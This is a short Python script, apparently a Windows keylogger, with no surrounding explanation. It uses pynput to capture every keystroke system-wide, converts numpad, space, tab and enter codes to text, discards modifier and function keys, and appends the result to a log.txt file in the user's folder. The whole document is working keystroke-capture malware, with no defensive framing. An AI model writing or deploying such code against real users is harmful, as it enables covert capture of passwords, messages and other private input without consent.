from pynput.keyboard import Listener
import getpass

user = getpass.getuser()

key_codes = [
    'Key.caps_lock', 'Key.shift', 'Key.shift_r', 'Key.alt_l', 'Key.alt_r', 'Key.ctrl_l', 'Key.ctrl_r', 'Key.cmd',
    'Key.menu', 'Key.esc', 'Key.num_lock', 'Key.f1', 'Key.f2', 'Key.f3', 'Key.f4', 'Key.f5', 'Key.f6', 'Key.f7',
    'Key.f8', 'Key.f9', 'Key.f10', 'Key.f11', 'Key.f12', 'Key.pause', 'Key.print_screen', 'Key.insert', 'Key.delete',
    'Key.up', 'Key.down', 'Key.left', 'Key.right', 'Key.home', 'Key.end', 'Key.page_down', 'Key.page_up',
    'Key.backspace'
]

numbers = {0: '<96>', 1: '<97>', 2: '<98>', 3: '<99>', 4: '<100>', 5: '<101>', 6: '<102>', 7: '<103>', 8: '<104>',
           9: '<105>'}


def write_to_file(key):
    key = str(key)
    key = key.replace("'", "")

    for k, v in numbers.items():
        if key == v:
            key = str(k)

    if key == 'Key.space':
        key = ' '
    if key == 'Key.tab':
        key = '    '
    if key == "Key.enter":
        key = '\n'
    if key in key_codes:
        key = ''

    with open(f"C:\\Users\\{user}\\Python\\log.txt", 'a') as f:
        f.write(key)


with Listener(on_press=write_to_file) as lis:
    lis.join()
